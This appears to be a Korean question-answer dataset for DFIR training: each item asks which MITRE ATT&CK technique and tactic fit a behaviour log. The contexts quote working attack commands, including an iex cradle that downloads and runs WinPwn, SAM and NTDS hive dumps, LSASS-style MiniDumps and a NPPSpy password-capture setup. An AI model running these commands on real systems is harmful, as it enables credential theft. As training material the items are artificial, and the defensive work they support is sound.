{"id": "T1001.002_T1001.002-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1001.002 Data Obfuscation via Steganography (Tactic: Command and Control)\n[요약] 이미지 파일과 tar 아카이브를 사용해 데이터를 은닉하는 스테가노그래피 기반 데이터 유출 시나리오를 시뮬레이션한다. 랜덤 패스워드를 생성해 tar 파일에 저장한 뒤, 이미지 바이트와 이어붙여 새로운 이미지 파일을 생성한다.\n[절차] 지정된 경로에 테스트용 이미지 파일이 존재하는지 확인하고, 없으면 원격 저장소에서 다운로드한다. 랜덤 패스워드를 여러 개 생성해 텍스트 파일(<passwords_file>)로 저장한다. <passwords_file>을 포함하는 tarz/tar 아카이브(<tar_file>)를 생성한다. 원본 이미지(<image_file>)와 tar 파일(<tar_file>)을 바이트 단위로 읽어 이어붙이고, 새 이미지(<new_image_file>)로 저장한다.\n[대표 명령 예시]\nGet-Content \"#{image_file}\", \"#{tar_file}\" -Encoding byte -ReadCount 0 | Set-Content \"#{new_image_file}\" -Encoding byte", "answer": "이 행위는 MITRE ATT&CK의 T1001.002 \"Data Obfuscation via Steganography\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Command and Control이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1001.002_T1001.002-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1001.002 Data Obfuscation via Steganography (Tactic: Command and Control)\n[요약] 악성 PowerShell 스크립트를 이미지 파일에 숨긴 뒤, Extract-Invoke-PSImage 스크립트를 사용해 내용을 추출·디코딩하고 실행하는 과정을 시뮬레이션한다. 결과적으로 정상적인 이미지처럼 보이는 파일을 통해 숨겨진 명령(Start-Process notepad)을 실행한다.\n[절차] 테스트에 사용할 악성 이미지(<image_file>)와 Extract-Invoke-PSImage 스크립트(<psimage_script>) 존재 여부를 확인한다. 필요 시 원격 GitHub 저장소에서 이미지와 Extract-Invoke-PSImage.ps1을 다운로드해 준비한다. Extract-Invoke-PSImage 모듈을 로드하고, 이미지에서 숨겨진 PowerShell 스크립트를 추출해 result.ps1로 저장한다. result.ps1에서 base64 인코딩된 페이로드를 추출해 디코딩하고 decoded.ps1 및 textExtraction.ps1로 저장한다. 최종 추출된 textExtraction.ps1 스크립트를 실행하여 내장된 명령(Start-Process notepad)을 수행한다.\n[대표 명령 예시]\ncd \"PathToAtomicsFolder\\ExternalPayloads\\\"; Import-Module .\\Extract-Invoke-PSImage.ps1; $extractedScript = Extract-Invoke-PSImage -Image \"#{image_file}\" -Out \"$HOME\\result.ps1\"; $scriptContent = Get-Content \"$HOME\\result.ps1\" -Raw; $base64Pattern = \"(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])\"; $base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value }; $base64Strings | Set-Content \"$HOME\\decoded.ps1\"; $decodedContent = Get-Content \"$HOME\\decoded.ps1\" -Raw; $decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent)); $textPattern = '^.+'; $textMatches = [regex]::Matches($decodedText, $textPattern) | ForEach-Object { $_.Value }; $scriptPath = \"$HOME\\textExtraction.ps1\"; $textMatches -join '' | Set-Content -Path $scriptPath; . \"$HOME\\textExtraction.ps1\"", "answer": "이 행위는 MITRE ATT&CK의 T1001.002 \"Data Obfuscation via Steganography\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Command and Control이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003_T1003-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003 OS Credential Dumping (Tactic: Credential Access)\n[요약] Gsecdump 도구를 사용해 메모리에서 계정 자격 증명과 해시를 덤프한다.\n[대표 명령 예시]\n\"#{gsecdump_exe}\" -a\n[기존 태그] action=[process_start] domain=[CredentialAccess] ttp=[OS_Credential_Dumping]", "answer": "이 행위는 MITRE ATT&CK의 T1003 \"OS Credential Dumping\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003_T1003-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003 OS Credential Dumping (Tactic: Credential Access)\n[요약] NPPSpy 네트워크 프로바이더 DLL을 등록해 로그인 시 평문 비밀번호를 C:\\NPPSpy.txt에 기록한다.\n[대표 명령 예시]\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\NPPSPY.dll\" -Destination \"C:\\Windows\\System32\"; $path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER; $UpdatedValue = $Path.PROVIDERORDER + \",NPPSpy\"; Set-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue; $rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy -ErrorAction Ignore; $rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -ErrorAction Ignore; $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Class\" -Value 2 -ErrorAction Ignore; $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Name\" -Value NPPSpy -ErrorAction Ignore; $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%SystemRoot%\\System32\\NPPSPY.dll\" -ErrorAction Ignore; echo \"[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\NPPSpy.txt\"\n[기존 태그] action=[file_create, registry_modification, process_start] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, NetworkProvider_Hijack]", "answer": "이 행위는 MITRE ATT&CK의 T1003 \"OS Credential Dumping\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003_T1003-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003 OS Credential Dumping (Tactic: Credential Access)\n[요약] RDP 연결을 처리하는 svchost.exe 프로세스를 MiniDump 해 TEMP 경로에 svchost-exe.dmp를 생성한다.\n[대표 명령 예시]\n$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore); if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id } ; C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full\n[기존 태그] action=[process_start, memory_dump] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, RDP_Credential_Dump]", "answer": "이 행위는 MITRE ATT&CK의 T1003 \"OS Credential Dumping\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003_T1003-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003 OS Credential Dumping (Tactic: Credential Access)\n[요약] IIS appcmd.exe list 옵션으로 애플리케이션 풀 정보를 조회해 서비스 계정 자격 증명을 확인한다.\n[대표 명령 예시]\nC:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@t:* ; C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@text:* ; C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /text:*\n[기존 태그] action=[process_start] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, WebService_Credential_Enumeration]", "answer": "이 행위는 MITRE ATT&CK의 T1003 \"OS Credential Dumping\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003_T1003-5_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003 OS Credential Dumping (Tactic: Credential Access)\n[요약] appcmd.exe list apppool /config 명령으로 IIS 애플리케이션 풀 전체 구성을 덤프해 서비스 계정 정보를 확인한다.\n[대표 명령 예시]\nC:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /config\n[기존 태그] action=[process_start] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, WebService_Credential_Enumeration]", "answer": "이 행위는 MITRE ATT&CK의 T1003 \"OS Credential Dumping\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003_T1003-6_Q6", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003 OS Credential Dumping (Tactic: Credential Access)\n[요약] rundll32.exe로 keymgr.dll의 KRShowKeyMgr를 호출해 Credential Manager UI를 띄우고 자격 증명을 내보낼 수 있게 한다.\n[대표 명령 예시]\nrundll32.exe keymgr,KRShowKeyMgr\n[기존 태그] action=[process_start, credential_export] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, Credential_Manager_Export]", "answer": "이 행위는 MITRE ATT&CK의 T1003 \"OS Credential Dumping\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003_T1003-7_Q7", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003 OS Credential Dumping (Tactic: Credential Access)\n[요약] rpcping 유틸리티로 RPC 테스트 연결을 보내면서 NTLM 인증을 강제로 수행하게 한다.\n[대표 명령 예시]\nrpcping -s #{server_ip} -e #{custom_port} -a privacy -u NTLM 1>$Null\n[기존 태그] action=[process_start, network_connection] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, NTLM_Hash_Exposure]", "answer": "이 행위는 MITRE ATT&CK의 T1003 \"OS Credential Dumping\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003.002_T1003.002-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003.002 OS Credential Dumping: Security Account Manager (Tactic: Credential Access)\n[요약] reg save를 사용해 HKLM\\sam, HKLM\\system, HKLM\\security 하이브를 %temp% 경로로 저장해 SAM, 캐시 크리덴셜, LSA 시크릿을 수집하는 시나리오다.\n[대표 명령 예시]\nreg save HKLM\\sam %temp%\\sam\r\nreg save HKLM\\system %temp%\\system\r\nreg save HKLM\\security %temp%\\security\n[기존 태그] action=[registry_export, file_create] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, SAM_Dump]", "answer": "이 행위는 MITRE ATT&CK의 T1003.002 \"OS Credential Dumping: Security Account Manager\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003.002_T1003.002-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003.002 OS Credential Dumping: Security Account Manager (Tactic: Credential Access)\n[요약] pypykatz를 파이썬 가상환경에서 실행해 LSASS/LSA 관련 레지스트리 하이브를 파싱하고 저장된 크리덴셜을 추출하는 시나리오다.\n[대표 명령 예시]\n\"#{venv_path}\\Scripts\\pypykatz\" live lsa\n[기존 태그] action=[process_start] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, LSA_Secrets_Dump]", "answer": "이 행위는 MITRE ATT&CK의 T1003.002 \"OS Credential Dumping: Security Account Manager\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003.002_T1003.002-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003.002 OS Credential Dumping: Security Account Manager (Tactic: Credential Access)\n[요약] esentutl.exe와 VSS를 이용해 SAM 하이브 파일을 복사한다. 기본값 기준 %SystemRoot%\\system32\\config\\SAM을 %temp%로 복사해 해시 추출에 사용한다.\n[대표 명령 예시]\nesentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}\n[기존 태그] action=[file_copy, vss_access] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, SAM_Dump]", "answer": "이 행위는 MITRE ATT&CK의 T1003.002 \"OS Credential Dumping: Security Account Manager\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003.002_T1003.002-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003.002 OS Credential Dumping: Security Account Manager (Tactic: Credential Access)\n[요약] Invoke-PowerDump.ps1 스크립트를 로드해 레지스트리에서 해시와 사용자 정보를 읽어오는 PowerDump 기반 해시덤프 시나리오다.\n[대표 명령 예시]\nWrite-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green; Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\"; Invoke-PowerDump\n[기존 태그] action=[script_download, process_start] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, Registry_Hashdump]", "answer": "이 행위는 MITRE ATT&CK의 T1003.002 \"OS Credential Dumping: Security Account Manager\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003.002_T1003.002-5_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003.002 OS Credential Dumping: Security Account Manager (Tactic: Credential Access)\n[요약] HiveNightmare/SeriousSAM 취약점을 악용해 certutil로 볼륨 섀도 카피에서 SAM 등 하이브를 덤프하고 %temp%에 저장하는 비관리자 계정 기반 시나리오다.\n[대표 명령 예시]\nfor /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%a\\Windows\\System32\\config\\#{target_hive}\" %temp%\\#{target_hive}vss%a 2 >nul 2>&1) & dir /B %temp%\\#{target_hive}vss*\n[기존 태그] action=[file_create, vss_access] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, HiveNightmare, SAM_Dump]", "answer": "이 행위는 MITRE ATT&CK의 T1003.002 \"OS Credential Dumping: Security Account Manager\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003.002_T1003.002-6_Q6", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003.002 OS Credential Dumping: Security Account Manager (Tactic: Credential Access)\n[요약] PowerShell의 System.IO.File.Copy를 이용해 볼륨 섀도 카피에서 SAM 등 하이브를 $env:TEMP로 복사하는 HiveNightmare 기반 시나리오다.\n[대표 명령 예시]\n1..#{limit} | % { try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\#{target_hive}\" , \"$env:TEMP\\#{target_hive}vss$_\", \"true\") } catch {} ; ls \"$env:TEMP\\#{target_hive}vss$_\" -ErrorAction Ignore }\n[기존 태그] action=[file_create, vss_access] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, HiveNightmare, SAM_Dump]", "answer": "이 행위는 MITRE ATT&CK의 T1003.002 \"OS Credential Dumping: Security Account Manager\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003.002_T1003.002-7_Q7", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003.002 OS Credential Dumping: Security Account Manager (Tactic: Credential Access)\n[요약] WinPwn.ps1을 원격에서 로드해 samfile 함수로 SAM 파일을 덤프하고 NTLM 해시를 수집하는 로컬 크리덴셜 루팅 시나리오다.\n[대표 명령 예시]\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); samfile -consoleoutput -noninteractive\n[기존 태그] action=[script_download, process_start] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, SAM_Dump]", "answer": "이 행위는 MITRE ATT&CK의 T1003.002 \"OS Credential Dumping: Security Account Manager\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003.002_T1003.002-8_Q8", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003.002 OS Credential Dumping: Security Account Manager (Tactic: Credential Access)\n[요약] reg export를 사용해 HKLM\\sam, HKLM\\system, HKLM\\security 하이브를 %temp%로 내보내 SAM, 캐시 크리덴셜, LSA 시크릿을 수집하는 시나리오다.\n[대표 명령 예시]\nreg export HKLM\\sam %temp%\\sam\r\nreg export HKLM\\system %temp%\\system\r\nreg export HKLM\\security %temp%\\security\n[기존 태그] action=[registry_export, file_create] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, SAM_Dump]", "answer": "이 행위는 MITRE ATT&CK의 T1003.002 \"OS Credential Dumping: Security Account Manager\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003.003_T1003.003-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003.003 OS Credential Dumping: NTDS (Tactic: Credential Access)\n[요약] 도메인 컨트롤러에서 vssadmin.exe를 사용해 지정 드라이브(C:)의 볼륨 섀도 카피를 생성한다. 이후 NTDS.dit와 SYSTEM 하이브를 섀도 카피에서 복사해 도메인 크리덴셜을 덤프하는 전 단계로 사용된다.\n[대표 명령 예시]\nvssadmin.exe create shadow /for=#{drive_letter}\n[기존 태그] action=[process_start, vss_access] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, NTDS_Dump, VSS_Abuse]", "answer": "이 행위는 MITRE ATT&CK의 T1003.003 \"OS Credential Dumping: NTDS\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003.003_T1003.003-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003.003 OS Credential Dumping: NTDS (Tactic: Credential Access)\n[요약] 이미 존재하는 볼륨 섀도 카피에서 NTDS.dit와 SYSTEM 하이브를 복사하고, 현재 HKLM\\SYSTEM 하이브를 reg save로 내보내 도메인 크리덴셜 복호화에 필요한 재료를 모두 수집한다.\n[대표 명령 예시]\ncopy #{vsc_name}\\Windows\\NTDS\\NTDS.dit #{extract_path}\\ntds.dit\r\ncopy #{vsc_name}\\Windows\\System32\\config\\SYSTEM #{extract_path}\\VSC_SYSTEM_HIVE\r\nreg save HKLM\\SYSTEM #{extract_path}\\SYSTEM_HIVE\n[기존 태그] action=[file_copy, registry_export] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, NTDS_Dump, VSS_Abuse]", "answer": "이 행위는 MITRE ATT&CK의 T1003.003 \"OS Credential Dumping: NTDS\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003.003_T1003.003-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003.003 OS Credential Dumping: NTDS (Tactic: Credential Access)\n[요약] 도메인 컨트롤러에서 NTDSUtil의 IFM(Install From Media) 기능을 사용해 ntds.dit를 오프라인 백업 형태로 덤프한다. 지정 폴더에 AD 데이터베이스 복사본이 생성된다.\n[대표 명령 예시]\nmkdir #{output_folder}\r\nntdsutil \"ac i ntds\" \"ifm\" \"create full #{output_folder}\" q q\n[기존 태그] action=[process_start, database_backup] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, NTDS_Dump]", "answer": "이 행위는 MITRE ATT&CK의 T1003.003 \"OS Credential Dumping: NTDS\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003.003_T1003.003-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003.003 OS Credential Dumping: NTDS (Tactic: Credential Access)\n[요약] 도메인 컨트롤러에서 WMI(wmic shadowcopy)를 사용해 지정 드라이브에 볼륨 섀도 카피를 생성한다. vssadmin 대신 WMI 인터페이스를 활용하는 방식이다.\n[대표 명령 예시]\nwmic shadowcopy call create Volume=#{drive_letter}\n[기존 태그] action=[process_start, vss_access] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, NTDS_Dump, VSS_Abuse]", "answer": "이 행위는 MITRE ATT&CK의 T1003.003 \"OS Credential Dumping: NTDS\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003.003_T1003.003-5_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003.003 OS Credential Dumping: NTDS (Tactic: Credential Access)\n[요약] 도메인 관리자 권한이 있는 원격 워크스테이션에서 WMI 원격 호출(wmic /node)을 사용해 대상 도메인 컨트롤러에 볼륨 섀도 카피를 생성한다.\n[대표 명령 예시]\nwmic /node:\"#{target_host}\" shadowcopy call create Volume=#{drive_letter}\n[기존 태그] action=[process_start, remote_execution, vss_access] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, NTDS_Dump, Remote_WMI]", "answer": "이 행위는 MITRE ATT&CK의 T1003.003 \"OS Credential Dumping: NTDS\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003.003_T1003.003-6_Q6", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003.003 OS Credential Dumping: NTDS (Tactic: Credential Access)\n[요약] 원격 WMI를 사용해 대상 도메인 컨트롤러에서 cmd.exe /c esentutl.exe /y /vss 를 실행시켜 NTDS.dit를 스냅샷에서 바로 지정 경로로 복사한다.\n[대표 명령 예시]\nwmic /node:\"#{target_host}\" process call create \"cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}\"\n[기존 태그] action=[remote_execution, file_copy, vss_access] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, NTDS_Dump, Remote_WMI, VSS_Abuse]", "answer": "이 행위는 MITRE ATT&CK의 T1003.003 \"OS Credential Dumping: NTDS\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003.003_T1003.003-7_Q7", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003.003 OS Credential Dumping: NTDS (Tactic: Credential Access)\n[요약] PowerShell에서 WMI 클래스를 직접 호출해 win32_shadowcopy.Create를 실행하고, 지정 드라이브에 ClientAccessible 유형의 섀도 카피를 생성한다.\n[대표 명령 예시]\n(gwmi -list win32_shadowcopy).Create('#{drive_letter}','ClientAccessible')\n[기존 태그] action=[process_start, vss_access] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, NTDS_Dump, VSS_Abuse]", "answer": "이 행위는 MITRE ATT&CK의 T1003.003 \"OS Credential Dumping: NTDS\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003.003_T1003.003-8_Q8", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003.003 OS Credential Dumping: NTDS (Tactic: Credential Access)\n[요약] vssadmin으로 섀도 카피를 생성한 뒤 mklink /D를 사용해 해당 섀도 카피 경로를 가리키는 디렉터리 심볼릭 링크를 만든다. 이를 통해 일반 경로처럼 VSS 내용을 탐색·복사할 수 있다.\n[대표 명령 예시]\nvssadmin.exe create shadow /for=#{drive_letter}\r\nmklink /D #{symlink_path} \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\n[기존 태그] action=[process_start, vss_access, symlink_create] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, NTDS_Dump, VSS_Abuse]", "answer": "이 행위는 MITRE ATT&CK의 T1003.003 \"OS Credential Dumping: NTDS\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
